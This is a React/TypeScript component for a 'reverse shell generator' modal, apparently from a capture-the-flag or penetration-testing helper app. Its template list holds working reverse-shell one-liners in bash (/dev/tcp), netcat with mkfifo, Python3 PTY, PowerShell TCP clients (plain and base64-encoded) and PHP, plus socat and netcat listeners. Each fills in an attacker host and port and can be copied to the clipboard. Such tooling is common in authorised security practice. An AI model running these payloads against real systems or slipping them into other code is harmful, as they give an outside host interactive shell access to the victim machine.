import React, { useState, useMemo } from 'react';
import { 
  X, 
  Copy, 
  Check, 
  Radio, 
  ArrowRight
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { useShallow } from 'zustand/react/shallow';
import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';
import { useNavigate } from 'react-router-dom';

interface ShellTemplate {
  id: string;
  name: string;
  category: 'Linux' | 'Windows' | 'Web' | 'Listener';
  command: (lhost: string, lport: string, rhost: string) => string;
}

const SHELL_TEMPLATES: ShellTemplate[] = [
  {
    id: 'bash-i',
    name: 'Bash Interactive',
    category: 'Linux',
    command: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  },
  {
    id: 'nc-fifo',
    name: 'Netcat Mkfifo',
    category: 'Linux',
    command: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
  },
  {
    id: 'py3-pty',
    name: 'Python3 PTY Shell',
    category: 'Linux',
    command: (h, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
  },
  {
    id: 'powershell-tcp',
    name: 'PowerShell Web TCP',
    category: 'Windows',
    command: (h, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    id: 'ps-base64',
    name: 'PowerShell Encoded (b64)',
    category: 'Windows',
    command: (h, p) => {
      const script = `$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      let b64 = '';
      try {
        const codeUnits = new Uint16Array(script.length);
        for (let i = 0; i < script.length; i++) codeUnits[i] = script.charCodeAt(i);
        const charCodes = new Uint8Array(codeUnits.buffer);
        let binary = '';
        for (let i = 0; i < charCodes.byteLength; i++) binary += String.fromCharCode(charCodes[i]);
        b64 = btoa(binary);
      } catch {
        b64 = 'ENCODING_ERROR';
      }
      return `powershell -nop -enc ${b64}`;
    },
  },
  {
    id: 'php-exec',
    name: 'PHP Exec',
    category: 'Web',
    command: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    id: 'socat-listener',
    name: 'Socat TTY Listener',
    category: 'Listener',
    command: (_h, p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
  },
  {
    id: 'rlwrap-nc',
    name: 'RLWrap Netcat Listener',
    category: 'Listener',
    command: (_h, p) => `rlwrap nc -lvnp ${p}`,
  },
];

export const RevShellModal: React.FC = () => {
  const navigate = useNavigate();
  const {
    revShellModalOpen,
    setRevShellModalOpen,
    globalVars,
    setGlobalVars,
    soundEnabled,
  } = useCtfStore(
    useShallow((s) => ({
      revShellModalOpen: s.revShellModalOpen,
      setRevShellModalOpen: s.setRevShellModalOpen,
      globalVars: s.globalVars,
      setGlobalVars: s.setGlobalVars,
      soundEnabled: s.soundEnabled,
    }))
  );

  const [categoryFilter, setCategoryFilter] = useState<'All' | 'Linux' | 'Windows' | 'Web' | 'Listener'>('All');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const lhost = globalVars.lhost || '10.10.14.X';
  const lport = globalVars.lport || '4444';
  const rhost = globalVars.targetIp || '10.10.10.X';

  const filteredTemplates = useMemo(() => {
    if (categoryFilter === 'All') return SHELL_TEMPLATES;
    return SHELL_TEMPLATES.filter((s) => s.category === categoryFilter);
  }, [categoryFilter]);

  const handleCopy = (id: string, text: string) => {
    safeCopyToClipboard(text);
    if (soundEnabled) playCyberSound('copy');
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  if (!revShellModalOpen) return null;

  const labelCls = 'block text-[11px] text-on-inverse-muted font-medium mb-1';
  const inputCls =
    'w-full px-2.5 py-1.5 rounded-lg bg-surface-inverse-elevated border border-inverse text-on-inverse text-xs font-mono tabular-nums placeholder:text-on-inverse-muted focus:border-syntax-flag focus:outline-none';

  return (
    <div
      role="dialog"
      aria-modal="true"
      aria-labelledby="revshell-modal-title"
      data-testid="revshell-modal"
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-surface-inverse/70 animate-in fade-in duration-150 font-sans"
    >
      {/* Intentionally dark panel in both color modes */}
      <div
        className="w-full max-w-2xl bg-surface-inverse text-on-inverse border border-inverse rounded-2xl shadow-xl overflow-hidden flex flex-col max-h-[85vh]"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="flex items-center justify-between px-4 py-3 bg-surface-inverse-elevated border-b border-inverse">
          <div className="flex items-center gap-2">
            <Radio className="w-4 h-4 text-on-inverse-muted" />
            <span id="revshell-modal-title" className="font-semibold text-sm text-on-inverse tracking-tight">
              Reverse shell generator
            </span>
          </div>
          <button
            type="button"
            onClick={() => setRevShellModalOpen(false)}
            aria-label="Close Reverse Shell Generator"
            className="p-1.5 rounded-lg text-on-inverse-muted hover:text-on-inverse hover:bg-surface-inverse transition-colors cursor-pointer [@media(pointer:coarse)]:min-h-11 [@media(pointer:coarse)]:min-w-11 flex items-center justify-center focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-syntax-flag"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Live variable sync */}
        <div className="px-4 py-3 border-b border-inverse grid grid-cols-3 gap-3 text-xs">
          <div>
            <label htmlFor="revshell-lhost" className={labelCls}>
              LHOST (Tun0 / Attacker)
            </label>
            <input
              id="revshell-lhost"
              name="lhost"
              type="text"
              value={globalVars.lhost || ''}
              onChange={(e) => setGlobalVars({ lhost: e.target.value })}
              placeholder="10.10.14.X"
              className={`font-mono tabular-nums ${inputCls}`}
            />
          </div>
          <div>
            <label htmlFor="revshell-lport" className={labelCls}>
              LPORT (Listener)
            </label>
            <input
              id="revshell-lport"
              name="lport"
              type="text"
              inputMode="numeric"
              maxLength={5}
              value={globalVars.lport || ''}
              onChange={(e) => {
                const digits = e.target.value.replace(/\D/g, '');
                if (!digits) {
                  setGlobalVars({ lport: '' });
                } else {
                  const num = parseInt(digits, 10);
                  if (num <= 65535) {
                    setGlobalVars({ lport: String(num) });
                  }
                }
              }}
              placeholder="4444"
              className={`font-mono tabular-nums ${inputCls}`}
            />
          </div>
          <div>
            <label htmlFor="revshell-rhost" className={labelCls}>
              RHOST (Active Target)
            </label>
            <input
              id="revshell-rhost"
              name="rhost"
              type="text"
              value={globalVars.targetIp || ''}
              onChange={(e) => setGlobalVars({ targetIp: e.target.value })}
              placeholder="10.10.10.X"
              className={inputCls}
            />
          </div>
        </div>

        {/* Category tabs */}
        <div className="flex items-center gap-1.5 px-4 py-2 border-b border-inverse overflow-x-auto text-xs scrollbar-none">
          {(['All', 'Linux', 'Windows', 'Web', 'Listener'] as const).map((cat) => (
            <button
              key={cat}
              onClick={() => setCategoryFilter(cat)}
              className={`px-3 py-1 rounded-md text-xs font-medium transition-colors whitespace-nowrap cursor-pointer border ${
                categoryFilter === cat
                  ? 'bg-surface-inverse-elevated text-on-inverse border-syntax-flag/60'
                  : 'text-on-inverse-muted hover:text-on-inverse hover:bg-surface-inverse-elevated border-transparent'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>

        {/* Payload list */}
        <div className="p-4 space-y-3 overflow-y-auto flex-1">
          {filteredTemplates.map((t) => {
            const rawCmd = t.command(lhost, lport, rhost);
            const isCopied = copiedId === t.id;

            return (
              <div
                key={t.id}
                className="p-3 rounded-xl bg-surface-inverse-elevated border border-inverse hover:border-syntax-comment/60 transition-colors space-y-2"
              >
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <span className="font-medium text-on-inverse">{t.name}</span>
                    <span className="text-[11px] text-on-inverse-muted">{t.category}</span>
                  </div>
                  <button
                    onClick={() => handleCopy(t.id, rawCmd)}
                    className={`px-2.5 py-1 rounded-lg border text-xs font-medium transition-colors flex items-center gap-1.5 cursor-pointer active:scale-[0.97] ${
                      isCopied
                        ? 'border-syntax-string/60 text-syntax-string'
                        : 'border-inverse text-on-inverse hover:bg-surface-inverse'
                    }`}
                  >
                    {isCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{isCopied ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
                <div className="p-2.5 rounded-lg bg-surface-inverse border border-inverse text-xs font-mono tabular-nums text-on-inverse break-all select-all">
                  {rawCmd}
                </div>
              </div>
            );
          })}
        </div>

        {/* Footer */}
        <div className="flex items-center justify-between px-4 py-2.5 bg-surface-inverse-elevated border-t border-inverse text-xs text-on-inverse-muted">
          <span>Variables auto-interpolated from active engagement context</span>
          <button
            onClick={() => {
              setRevShellModalOpen(false);
              navigate('/cheatsheets?tab=revshell');
            }}
            className="flex items-center gap-1 text-syntax-flag hover:underline text-xs cursor-pointer"
          >
            <span>Full RevShell arsenal</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>
    </div>
  );
};

export default RevShellModal;
